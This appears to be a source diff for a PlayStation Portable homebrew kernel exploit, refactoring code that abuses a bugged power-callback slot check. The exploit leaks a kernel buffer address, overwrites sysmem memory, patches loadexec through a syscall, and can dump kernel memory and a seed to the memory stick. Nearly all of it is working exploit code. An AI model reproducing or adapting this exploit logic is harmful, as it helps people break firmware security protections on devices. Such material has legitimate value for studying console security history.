@@ -62,10 +62,10 @@ int dump_kmem = 0;
 int (* LoadReboot)(void * arg1, unsigned int arg2, void * arg3, unsigned int arg4) = NULL;
 
 //register callback function - slot bugged. :D
-int (* _scePowerRegisterCallback)(unsigned int slot, int cbid) = NULL;
+int scePowerRegisterCallbackPrivate(unsigned int slot, int cbid);
 
 //unregister callback function - its slotcheck is bugged too. ;)
-int (* _scePowerUnregisterCallback)(unsigned int slot) = NULL;
+int scePowerUnregisterCallbackPrivate(unsigned int slot);
 
 //load reboot wrapper
 int _LoadReboot(void * arg1, unsigned int arg2, void * arg3, unsigned int arg4)
@@ -269,7 +269,7 @@ static u16 g_working_intr_prefix[] = {
 // a2 < 0(kernelSyscall)
 // a3 < 0
 // t0 > 0
-int IsOneOfIntr(u32 intr)
+int is_intr_OK(u32 intr)
 {
 	u16 prefix;
 	int i;
@@ -308,13 +308,13 @@ static void patch_power_arg(int cbid, u32 power_buf_address)
 
 	while (1) {
 		slot = 0x204>>4;
-		_scePowerUnregisterCallback(slot);
-		_scePowerRegisterCallback(slot, cbid);
+		scePowerUnregisterCallbackPrivate(slot);
+		scePowerRegisterCallbackPrivate(slot, cbid);
 
 		*(u32*)0x08900008 = 0xDEADBEEF;
 		slot = get_power_slot_by_address(0x08900000, power_buf_address);
-		_scePowerUnregisterCallback(slot);
-		_scePowerRegisterCallback(slot, cbid);
+		scePowerUnregisterCallbackPrivate(slot);
+		scePowerRegisterCallbackPrivate(slot, cbid);
 
 		if (*((u32*)0x08900008) == 0) {
 			printk("%s: power_arg noped\r\n", __func__);
@@ -323,6 +323,17 @@ static void patch_power_arg(int cbid, u32 power_buf_address)
 
 		printk("Retrying...\r\n");
 		sceKernelDelayThread(1000000);
+	}
+}
+
+void input_dump_kmem(void)
+{
+	SceCtrlData ctl;
+	sceCtrlReadBufferPositive(&ctl, 1);
+
+	if (ctl.Buttons & PSP_CTRL_LTRIGGER) {
+		dump_kmem = 1;
+		pspDebugScreenPrintf("Kernel memory will be dumped into ms0:/KMEM.BIN and ms0:/SEED.BIN\r\n");
 	}
 }
 
@@ -340,18 +351,10 @@ int main(int argc, char * argv[])
 	printk("Hello exploit\r\n");
 	pspDebugScreenInit();
 
-	{
-		SceCtrlData ctl;
-		sceCtrlReadBufferPositive(&ctl, 1);
-
-		if (ctl.Buttons & PSP_CTRL_LTRIGGER) {
-			dump_kmem = 1;
-			pspDebugScreenPrintf("Kernel memory will be dumped into ms0:/KMEM.BIN and ms0:/SEED.BIN\r\n");
-		}
-	}
+	input_dump_kmem();
 
 	//create a fitting one
-	while(!IsOneOfIntr((u32)cbid))
+	while(!is_intr_OK((u32)cbid))
 	{
 		//sceKernelDeleteCallback(cbid);
 		cbid = sceKernelCreateCallback("", NULL, NULL);
@@ -359,107 +362,59 @@ int main(int argc, char * argv[])
 
 	printk("Got a CBID: 0x%08X\r\n", cbid);
 
-	//html parameter
-	pspUtilityHtmlViewerParam param;
-	memset(&param, 0, sizeof(param));
-	param.base.size = sizeof(param);
-	param.base.accessThread = 0x13;
+	//Davee $v1 trick, $v1 would leak the power_buf_address when called on an registered slot 0
+	scePowerRegisterCallbackPrivate(0, cbid);
+	power_buf_address = get_power_address(cbid);
+	scePowerUnregisterCallbackPrivate(0);
+	printk("power_buf_address 0x%08X\r\n", power_buf_address);
 
-	//load html module
-	result = sceUtilityHtmlViewerInitStart(&param);
-
-	//html module loaded
-	if(result >= 0)
-	{
-		//wait for module
-		sceKernelDelayThread(2000000);
-
-		//partition 2 memory
-		char * partition2 = (char *)0x08800000;
-
-		//"sceVshHVUtility_Module" module
-		char * sceVshVH = NULL;
-
-		//local string copy
-		//we need to compare this pointer in the scan...
-		//as we are in the user partition too, we might find ourselves...
-		//so we need to make sure we don't hit this pointer.
-		const char * localVshVH = "sceVshHV";
-
-		//find the module
-		//Coldbird: it's at offset 0xBC70 in 6.31...
-		for(sceVshVH = partition2; sceVshVH < (char *)0x0A000000; sceVshVH += 4)
-		{
-			//found module name
-			if(strncmp(sceVshVH, localVshVH, 8) == 0 && sceVshVH != localVshVH) break;
-		}
-
-		//register callback function - slot bugged. :D
-		_scePowerRegisterCallback = (void *)(sceVshVH - 552);
-
-		//unregister callback function - its slotcheck is bugged too. ;)
-		_scePowerUnregisterCallback = (void *)(sceVshVH - 616);
-
-		printk("_scePowerRegisterCallback: 0x%08X\r\n", (u32)_scePowerRegisterCallback);
-		printk("_scePowerUnregisterCallback: 0x%08X\r\n", (u32)_scePowerUnregisterCallback);
-
-		//set k1 register to trigger slot bug
-		pspSdkSetK1(0);
-
-		//Davee $v1 trick, $v1 would leak the power_buf_address when called on an registered slot 0
-		_scePowerRegisterCallback(0, cbid);
-		power_buf_address = get_power_address(cbid);
-		_scePowerUnregisterCallback(0);
-		printk("power_buf_address 0x%08X\r\n", power_buf_address);
-
-		if(!is_pspgo()) {
-			patch_power_arg(cbid, power_buf_address);
-		}
-
-		//override sysmem function
-		unsigned int smpos = 0xA110; for(; smpos < 0xA1F0; smpos += 16)
-		{
-			//calculate slot
-			unsigned int slot = get_power_slot_by_address(((u32)0x88000000)+smpos, power_buf_address);
-
-			//wipe memory with -1... else overriding fails.
-			_scePowerUnregisterCallback(slot);
-
-			//register dummy callback (override memory ^^)
-			result = _scePowerRegisterCallback(slot, cbid);
-
-			//patching error
-			if(result) break;
-		}
-
-		//flush changes to memory
-		sync_cache();
-
-		//restoring instructions and patching loadexec
-		unsigned int interrupts = pspSdkDisableInterrupts();
-		result = SysMemUserForUser_D8DE5C1E(0xC01DB15D, 0xC00DCAFE, kernelSyscall, 0x12345678, -1);
-		pspSdkEnableInterrupts(interrupts);
-
-		if ( dump_kmem ) {
-			SceUID fd;
-
-			fd = sceIoOpen("ms0:/kmem.bin", PSP_O_WRONLY | PSP_O_CREAT | PSP_O_TRUNC, 0777);
-
-			if (fd >= 0) {
-				sceIoWrite(fd, (void*)0x08A00000, 0x400000);
-				sceIoClose(fd);
-			}
-
-			fd = sceIoOpen("ms0:/seed.bin", PSP_O_WRONLY | PSP_O_CREAT | PSP_O_TRUNC, 0777);
-
-			if (fd >= 0) {
-				sceIoWrite(fd, (void*)(0x08A00000+0x400000), 0x100);
-				sceIoClose(fd);
-			}
-		}
-
-		printk("SysMemUserForUser_D8DE5C1E returns 0x%08X\r\n", result);
+	if(!is_pspgo()) {
+		patch_power_arg(cbid, power_buf_address);
 	}
+
+	//override sysmem function
+	unsigned int smpos = 0xA110; for(; smpos < 0xA1F0; smpos += 16)
+	{
+		//calculate slot
+		unsigned int slot = get_power_slot_by_address(((u32)0x88000000)+smpos, power_buf_address);
+
+		//wipe memory with -1... else overriding fails.
+		scePowerUnregisterCallbackPrivate(slot);
+
+		//register dummy callback (override memory ^^)
+		result = scePowerRegisterCallbackPrivate(slot, cbid);
+
+		//patching error
+		if(result) break;
+	}
+
+	//flush changes to memory
+	sync_cache();
+
+	//restoring instructions and patching loadexec
+	unsigned int interrupts = pspSdkDisableInterrupts();
+	result = SysMemUserForUser_D8DE5C1E(0xC01DB15D, 0xC00DCAFE, kernelSyscall, 0x12345678, -1);
+	pspSdkEnableInterrupts(interrupts);
+
+	if ( dump_kmem ) {
+		SceUID fd;
+
+		fd = sceIoOpen("ms0:/kmem.bin", PSP_O_WRONLY | PSP_O_CREAT | PSP_O_TRUNC, 0777);
+
+		if (fd >= 0) {
+			sceIoWrite(fd, (void*)0x08A00000, 0x400000);
+			sceIoClose(fd);
+		}
+
+		fd = sceIoOpen("ms0:/seed.bin", PSP_O_WRONLY | PSP_O_CREAT | PSP_O_TRUNC, 0777);
+
+		if (fd >= 0) {
+			sceIoWrite(fd, (void*)(0x08A00000+0x400000), 0x100);
+			sceIoClose(fd);
+		}
+	}
+
+	printk("SysMemUserForUser_D8DE5C1E returns 0x%08X\r\n", result);
 
 	//trigger reboot
 	sceKernelExitGame();
